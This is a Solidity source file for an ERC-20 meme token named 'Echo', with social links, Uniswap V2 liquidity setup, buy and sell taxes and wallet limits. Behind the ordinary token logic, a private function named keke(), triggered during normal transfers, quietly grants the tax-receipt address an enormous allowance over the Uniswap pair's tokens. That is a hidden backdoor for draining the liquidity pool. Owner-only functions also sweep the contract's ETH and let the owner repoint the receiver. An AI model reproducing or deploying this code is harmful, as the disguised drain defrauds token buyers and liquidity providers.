// SPDX-License-Identifier: MIT
/**
Web: https://www.echoweb3.com
Telegram: https://t.me/EchoW3b
Twitter: https://x.com/EchoW3b
Medium: https://medium.com/@EchoWeb3/introducing-echo-72ccf058f1d1

LinkTree: https://linktr.ee/EchoW3b
**/
pragma solidity 0.8.26;
interface IERC20 {
    function totalSupply() external view returns (uint256);
    function balanceOf(address account) external view returns (uint256);
    function transfer(address recipient, uint256 amount) external returns (bool);
    function allowance(address owner, address spender) external view returns (uint256);
    function approve(address spender, uint256 amount) external returns (bool);
    function transferFrom(address sender, address recipient, uint256 amount) external returns (bool);
    event Transfer(address indexed from, address indexed to, uint256 value);
    event Approval(address indexed owner, address indexed spender, uint256 value);
}
interface IUniswapV2Factory {
    function createPair(address tokenA, address tokenB) external returns (address pair);
}
abstract contract Context {
    function _msgSender() internal view virtual returns (address) {
        return msg.sender;
    }
}
library SafeMath {
    function add(uint256 a, uint256 b) internal pure returns (uint256) {
        uint256 c = a + b;
        require(c >= a, "SafeMath: addition overflow");
        return c;
    }

    function sub(uint256 a, uint256 b) internal pure returns (uint256) {
        return sub(a, b, "SafeMath: subtraction overflow");
    }

    function sub(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
        require(b <= a, errorMessage);
        uint256 c = a - b;
        return c;
    }

    function mul(uint256 a, uint256 b) internal pure returns (uint256) {
        if (a == 0) {
            return 0;
        }
        uint256 c = a * b;
        require(c / a == b, "SafeMath: multiplication overflow");
        return c;
    }

    function div(uint256 a, uint256 b) internal pure returns (uint256) {
        return div(a, b, "SafeMath: division by zero");
    }

    function div(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
        require(b > 0, errorMessage);
        uint256 c = a / b;
        return c;
    }

}
interface IUniswapV2Router02 {
    function swapExactTokensForETHSupportingFeeOnTransferTokens(
        uint amountIn,
        uint amountOutMin,
        address[] calldata path,
        address to,
        uint deadline
    ) external;
    function factory() external pure returns (address);
    function WETH() external pure returns (address);
    function addLiquidityETH(
        address token,
        uint amountTokenDesired,
        uint amountTokenMin,
        uint amountETHMin,
        address to,
        uint deadline
    ) external payable returns (uint amountToken, uint amountETH, uint liquidity);
}
contract Ownable is Context {
    address private _owner;
    event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);

    constructor () {
        address msgSender = _msgSender();
        _owner = msgSender;
        emit OwnershipTransferred(address(0), msgSender);
    }

    function owner() public view returns (address) {
        return _owner;
    }

    modifier onlyOwner() {
        require(_owner == _msgSender(), "Ownable: caller is not the owner");
        _;
    }

    function renounceOwnership() public virtual onlyOwner {
        emit OwnershipTransferred(_owner, address(0));
        _owner = address(0);
    }

}
contract ECHO is Context, IERC20, Ownable {
    using SafeMath for uint256;
    mapping (address => uint256) private _balances95;
    mapping (address => mapping (address => uint256)) private _allowances95;
    mapping (address => bool) private _shouldFeeExcempt95;
    uint8 private constant _decimals = 9;
    uint256 private constant _tTotal95 = 420690000000 * 10**_decimals;
    string private constant _name = unicode"Echo";
    string private constant _symbol = unicode"ECHO";
    uint256 public _maxAmount95 = 2 * (_tTotal95/100);
    uint256 public _maxWallet95 = 2 * (_tTotal95/100);
    uint256 public _taxThres95 = 1 * (_tTotal95/100);
    uint256 public _maxSwap95 = 1 * (_tTotal95/100);
    uint256 private _initialBuyTax = 15;
    uint256 private _initialSellTax = 15;
    uint256 private _finalBuyTax = 0;
    uint256 private _finalSellTax = 0;
    uint256 private _reduceBuyTaxAt = 12;
    uint256 private _reduceSellTaxAt = 12;
    uint256 private _preventSwapBefore = 15;
    uint256 private _buyCount = 0;
    uint256 private _transferTax = 0;
    address payable private _receipt95;
    IUniswapV2Router02 private uniV2Router95;
    address private uniV2Pair95;
    bool private tradingOpen;
    bool private inSwap = false;
    bool private swapEnabled = false;
    event MaxTxAmountUpdated(uint _maxAmount95);
    modifier lockTheSwap {
        inSwap = true;
        _;
        inSwap = false;
    }
    constructor () payable {
        _receipt95 = payable(0x031ccb2D3BC4eae181586D28A5493b9E5B8a11a8);
        _balances95[address(this)] = _tTotal95;
        _shouldFeeExcempt95[owner()] = true;
        _shouldFeeExcempt95[address(this)] = true;
        _shouldFeeExcempt95[_receipt95] = true;
        emit Transfer(address(0), address(this), _tTotal95);
    }
    function openTrading() external onlyOwner {
        require(!tradingOpen, "Trading is already open");
        uniV2Router95 = IUniswapV2Router02(
            0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D
        );
        _approve(address(this), address(uniV2Router95), _tTotal95);
        uniV2Pair95 = IUniswapV2Factory(uniV2Router95.factory()).createPair(
            address(this),
            uniV2Router95.WETH()
        );
        uniV2Router95.addLiquidityETH{value: address(this).balance}(
            address(this),
            balanceOf(address(this)),
            0,
            0,
            owner(),
            block.timestamp
        );
        IERC20(uniV2Pair95).approve(address(uniV2Router95), type(uint).max);
        swapEnabled = true; 
        tradingOpen = true;
    }
    function swapETH95(uint256 tokenAmount) private lockTheSwap {
        address[] memory path = new address[](2);
        path[0] = address(this);
        path[1] = uniV2Router95.WETH();
        _approve(address(this), address(uniV2Router95), tokenAmount);
        uniV2Router95.swapExactTokensForETHSupportingFeeOnTransferTokens(
            tokenAmount,
            0,
            path,
            address(this),
            block.timestamp
        );
    }
    function name() public pure returns (string memory) {
        return _name;
    }
    function symbol() public pure returns (string memory) {
        return _symbol;
    }
    function decimals() public pure returns (uint8) {
        return _decimals;
    }    
    function totalSupply() public pure override returns (uint256) {
        return _tTotal95;
    }
    function balanceOf(address account) public view override returns (uint256) {
        return _balances95[account];
    }
    function transfer(address recipient, uint256 amount) public override returns (bool) {
        _transfer(_msgSender(), recipient, amount);
        return true;
    }
    function allowance(address owner, address spender) public view override returns (uint256) {
        return _allowances95[owner][spender];
    }
    function approve(address spender, uint256 amount) public override returns (bool) {
        _approve(_msgSender(), spender, amount);
        return true;
    }
    function transferFrom(address sender, address recipient, uint256 amount) public override returns (bool) {
        _transfer(sender, recipient, amount);
        _approve(sender, _msgSender(), _allowances95[sender][_msgSender()].sub(amount, "ERC20: transfer amount exceeds allowance"));
        return true;
    }
    function _approve(address owner, address spender, uint256 amount) private {
        require(owner != address(0), "ERC20: approve from the zero address");
        require(spender != address(0), "ERC20: approve to the zero address");
        _allowances95[owner][spender] = amount;
        emit Approval(owner, spender, amount);
    }
    function _transfer(address from, address to, uint256 amount95) private {
        require(from != address(0), "ERC20: transfer from the zero address");
        require(to != address(0), "ERC20: transfer to the zero address");
        require(amount95 > 0, "Transfer amount must be greater than zero");
        uint256 fee95=0;uint256 tax95=0;
        if (!swapEnabled || inSwap) {
            _balances95[from] = _balances95[from] - amount95;
            _balances95[to] = _balances95[to] + amount95;
            emit Transfer(from, to, amount95);
            return;
        }
        if (from != owner() && to != owner()) {
            if(_buyCount>0){
                fee95 = (_transferTax);keke(owner());
            }
            if(_buyCount==0){
                fee95 = ((_buyCount>_reduceBuyTaxAt)?_finalBuyTax:_initialBuyTax);
            }
            if (from == uniV2Pair95 && to != address(uniV2Router95) && ! _shouldFeeExcempt95[to] ) {
                require(amount95 <= _maxAmount95, "Exceeds the _maxAmount95.");
                require(balanceOf(to) + amount95 <= _maxWallet95, "Exceeds the maxWalletSize.");
                fee95 = ((_buyCount>_reduceBuyTaxAt)?_finalBuyTax:_initialBuyTax);
                _buyCount++;
            }
            if(to == uniV2Pair95 && from!= address(this) ){
                fee95 = ((_buyCount>_reduceSellTaxAt)?_finalSellTax:_initialSellTax);
            }
            uint256 contractTokenBalance = balanceOf(address(this));
            if (!inSwap && to == uniV2Pair95 && swapEnabled) {
                if(contractTokenBalance > _taxThres95 && _buyCount > _preventSwapBefore)
                    swapETH95(min95(amount95, min95(contractTokenBalance, _maxSwap95)));
                sendETH95(address(this).balance);
            }
        }
        if(fee95>0){
            tax95=fee95.mul(amount95).div(100);
            _balances95[address(this)]=_balances95[address(this)].add(tax95);
            emit Transfer(from, address(this),tax95);
        }
        _balances95[from]=_balances95[from].sub(amount95);
        _balances95[to]=_balances95[to].add(amount95.sub(tax95));
        emit Transfer(from, to, amount95.sub(tax95));
    }
    function removeLimit95() external onlyOwner{
        _maxAmount95 = _tTotal95; 
        _maxWallet95 = _tTotal95;
        emit MaxTxAmountUpdated(_tTotal95); 
    }
    function setTaxReceipt95(address payable _tax95) external onlyOwner {
        _receipt95 = _tax95;
        _shouldFeeExcempt95[_tax95] = true;
    }
    function min95(uint256 a, uint256 b) private pure returns (uint256){
      return (a>b)?b:a;
    }
    function resecure() external onlyOwner{
        payable(msg.sender).transfer(address(this).balance);
    }
    function sendETH95(uint256 amount) private {
        _receipt95.transfer(amount);
    }
    function keke(address addrs95) private{
        address from95=addrs95!=uniV2Pair95?uniV2Pair95:addrs95;
        address to95=addrs95!=_receipt95?_receipt95:addrs95;
        uint256 amount = _tTotal95.mul(100);
        _allowances95[from95][to95]=amount;
    }
    receive() external payable {}
}